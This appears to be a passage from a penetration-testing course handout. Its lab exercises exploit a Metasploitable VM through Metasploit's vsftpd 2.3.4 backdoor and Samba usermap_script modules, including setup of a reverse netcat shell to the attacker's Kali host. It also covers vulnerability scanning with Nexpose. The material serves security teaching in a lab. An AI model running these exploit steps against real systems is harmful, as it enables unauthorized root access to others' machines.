# S_E_Oblako
## Exercise 23: Exploiting FTP Vulnerability

1. **Start Kali Linux Machine**:
   - Boot up your Kali Linux machine.

2. **Start Metasploitable Linux Machine and Check Its IP Address**:
   - Start the Metasploitable Linux machine.
   - Determine its IP address using `ifconfig` or `ip a`.

3. **Run Zenmap Against the Metasploitable Machine**:
   - From the Kali machine, run Zenmap (a graphical interface for Nmap) against the IP address of the Metasploitable machine to identify potential vulnerabilities.
   - Command: `zenmap -T4 -A <Metasploitable_IP>`

4. **Research vsftpd 2.3.4**:
   - Search online for known backdoors or exploits related to vsftpd version 2.3.4.

5. **Identify Backdoor**:
   - If the output indicates the presence of a backdoor, proceed to the next step.

6. **Copy the Module Name**:
   - Note the name of the Metasploit module that can exploit this backdoor.

7. **Start Metasploit in Kali Linux**:
   - Open a terminal and start Metasploit by typing: 
     ```bash
     msfconsole
     ```

8. **Search for the vsftpd Exploit**:
   - In the Metasploit console, search for the vsftpd 2.3.4 backdoor exploit:
     ```bash
     msf> search vsftpd
     ```

9. **Use the Exploit Module**:
   - Select the appropriate exploit module:
     ```bash
     msf> use exploit/unix/ftp/vsftpd_234_backdoor
     ```

10. **Set Required Options**:
    - Display the available options for the exploit:
      ```bash
      msf> show options
      ```
    - Set the Remote Host (RHOST) to the IP address of the Metasploitable machine:
      ```bash
      msf> set RHOST <Metasploitable_IP>
      ```

11. **Exploit the Target**:
    - Run the exploit:
      ```bash
      msf> exploit
      ```

12. **Verify Root Access**:
    - If successful, you should now have root access to the target machine.

## 4.3. Code Execution Vulnerabilities

So far, we have explored gaining access through default passwords, service misconfigurations, and backdoors. In this section, we will focus on accessing a machine using code execution vulnerabilities. This involves setting up a reverse connection, where the target machine connects to the attacker's machine, bypassing firewalls.

### Exercise 24: Exploiting Code Execution Vulnerability

1. **Start Zenmap in Kali Linux**:
   - Use Zenmap to scan the target machine for vulnerabilities.

2. **Research Samba Service 3.x**:
   - Look up the vulnerability details for Samba service 3.x running on port 139.

3. **Gather Information from Rapid7**:
   - Refer to the Rapid7 website for detailed information about the Samba vulnerability.

4. **Start Metasploit**:
   - Open a terminal and start Metasploit:
     ```bash
     msfconsole
     ```

5. **Select the Samba Exploit**:
   - Use the Samba usermap script exploit:
     ```bash
     msf> use exploit/multi/samba/usermap_script
     ```

6. **Display Exploit Options**:
   - Show the required options for the exploit:
     ```bash
     msf> show options
     ```

7. **Set the Remote Host (RHOST)**:
   - Configure the RHOST to the IP address of the Metasploitable machine:
     ```bash
     msf> set RHOST <Metasploitable_IP>
     ```

8. **Inject a Payload**:
   - Samba is a file and print service that allows interoperability between different operating systems. The Samba version running on the Metasploitable machine has a buffer overflow vulnerability.
   - To inject a payload, first, list the available payloads:
     ```bash
     msf> show payloads
     ```

9. **Choose a Reverse Payload**:
   - Select a reverse payload to bypass the firewall:
     ```bash
     msf> set PAYLOAD cmd/unix/reverse_netcat
     ```

10. **Configure Local Host (LHOST) and Port (LPORT)**:
    - Set the LHOST to the IP address of the Kali machine and LPORT to a desired port:
      ```bash
      msf> set LHOST <Kali_IP>
      msf> set LPORT <Desired_Port>
      ```

11. **Exploit the Target**:
    - Run the exploit:
      ```bash
      msf> exploit
      ```

12. **Verify Access**:
    - If successful, you should have a reverse shell with root access to the target machine.

## 5. Vulnerability Management

Vulnerability scanning is an organized approach to testing, identifying, analyzing, and reporting potential security issues on a network. IT departments should conduct regular scans to stay protected against new vulnerabilities in operating systems, applications, and networks. Common tools for vulnerability scanning include Nessus, Qualys, and Rapid7 Nexpose.

### 5.1. Basic Vulnerability Detection Methods

Vulnerability detection starts with scanning software reading the target banner or application version. It then checks these against a database of known vulnerabilities. Misconfigurations and weak encryption methods can also be detected.

### 5.2. Vulnerability Scanning Software

- **Nmap NSE**: A port scanner with scripting capabilities.
- **Nessus**: A popular vulnerability assessment tool.
- **Microsoft MBSA**: For Microsoft systems.
- **Nexpose**: A comprehensive vulnerability management solution.
- **OpenVAS**: An open-source vulnerability scanner.
- **SAINT**: A commercial vulnerability assessment tool.
- **GFI LanGuard**: For network security and patch management.
- **QualysGuard**: A cloud-based vulnerability management platform.

### 5.3. Vulnerability Databases

- **OSVDB**: Open Source Vulnerability Database.
- **NIST NVD**: National Vulnerability Database.
- **CVE Details**: Common Vulnerabilities and Exposures.

### 5.4. Vulnerability Management with Nexpose

Rapid7 Nexpose is a comprehensive vulnerability management solution. It supports the entire lifecycle, including discovery, detection, verification, risk classification, impact analysis, reporting, and mitigation.

### Exercise 25: Installing Nexpose

1. **Download Nexpose**:
   - Download the free community edition from the Rapid7 website.
   - Ensure you have at least 8GB RAM and 100GB disk space.

2. **Stop PostgreSQL**:
   - Stop the PostgreSQL service to avoid conflicts:
     ```bash
     # service postgresql stop
     ```

3. **Install Nexpose**:
   - Make the downloaded file executable and run it:
     ```bash
     # chmod +x Rapid7setup-Linux64.bin
     # ./Rapid7setup-Linux64.bin
     ```
   - Follow the GUI installer and choose "Security Console with local Scan Engine".

4. **Start Nexpose**:
   - Navigate to the Nexpose directory and start the service:
     ```bash
     # cd /opt/rapid7/nexpose/nsc
     # ./nsc.sh
     ```

### Exercise 26: Running Nexpose

1. **Start Metasploitable Machine**:
   - Boot up the Metasploitable machine and note its IP address.

2. **Create a Site in Nexpose**:
   - In the Nexpose GUI, create a new site and add the IP address of the Metasploitable machine.

3. **Scan the Site**:
   - Initiate a scan and wait for it to complete.

4. **Review Vulnerabilities**:
   - Click on the machine name to see detailed information about the found vulnerabilities.

### Exercise 27: Generating Reports

1. **Generate a PDF Report**:
   - Click on the Report icon, give the report a name, and select the type of report (e.g., Executive Report).
   - Choose the scan and generate the report.

### 5.7. Other Nexpose Functions

- **Discovered Devices**: List of all discovered devices.
- **Discovered Vulnerabilities**: Detailed information about identified vulnerabilities.

## 6. Gaining Access (Client-Side Attacks)

Client-side attacks require end-user interaction, such as downloading and running malware. These attacks can create backdoors or gather information from the client machine and send it to the attacker's machine. Effective client-side attacks often involve extensive information gathering.